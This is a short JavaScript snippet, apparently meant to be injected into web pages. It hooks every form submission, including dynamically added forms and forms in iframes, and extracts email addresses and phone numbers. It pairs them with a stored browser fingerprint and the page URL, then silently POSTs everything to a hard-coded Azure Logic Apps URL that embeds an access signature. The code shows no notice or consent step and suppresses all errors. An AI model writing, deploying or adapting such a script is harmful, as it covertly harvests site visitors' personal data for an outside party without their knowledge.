(function () {
    const endpoint = 'https://prod-77.eastus.logic.azure.com:443/workflows/6c849d0f954f4c1fb9e9ffda201c6a78/triggers/When_a_HTTP_request_is_received/paths/invoke?api-version=2016-10-01&sp=%2Ftriggers%2FWhen_a_HTTP_request_is_received%2Frun&sv=1.0&sig=Enumg5HG56_2UeV6oy7KAXrGiARdfkUj__tO_TIUpa4';

    function extractData(form) {
        const formData = new FormData(form);
        let email = '';
        let phone = '';

        for (const [key, value] of formData.entries()) {
            if (!email && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
                email = value;
            }
            if (!phone && /(?:\+?(\d{1,3}))?[-.\s()]*(\d{3})[-.\s()]*(\d{3,4})[-.\s()]*(\d{4})/.test(value)) {
                phone = value;
            }
        }

        return { email, phone };
    }

    function sendData(data) {
        fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    }

    function handleFormSubmission(event) {
        const form = event.target;
        const { email, phone } = extractData(form);

        if (email || phone) {
            const fp = localStorage.getItem('camfpv2') || '';
            sendData({
                fpData: fp,
                email,
                phone,
                website: window.location.href,
                type: 'form'
            });
        }
    }

    function monitorForms(context = document) {
        const forms = context.querySelectorAll('form');
        forms.forEach(form => {
            if (!form.dataset.tracked) {
                form.addEventListener('submit', handleFormSubmission, true);
                form.dataset.tracked = 'true';
            }
        });
    }

    monitorForms();

    const observer = new MutationObserver(mutations => {
        for (const mutation of mutations) {
            mutation.addedNodes.forEach(node => {
                if (node.nodeType === 1) {
                    if (node.tagName === 'FORM') {
                        monitorForms(node.parentNode || document);
                    } else {
                        monitorForms(node);
                    }
                }
            });
        }
    });

    observer.observe(document.body, { childList: true, subtree: true });

    window.addEventListener('load', () => {
        document.querySelectorAll('iframe').forEach(iframe => {
            try {
                if (iframe.contentWindow && iframe.contentDocument) {
                    monitorForms(iframe.contentDocument);
                }
            } catch (err) {
            }
        });
    });
})();
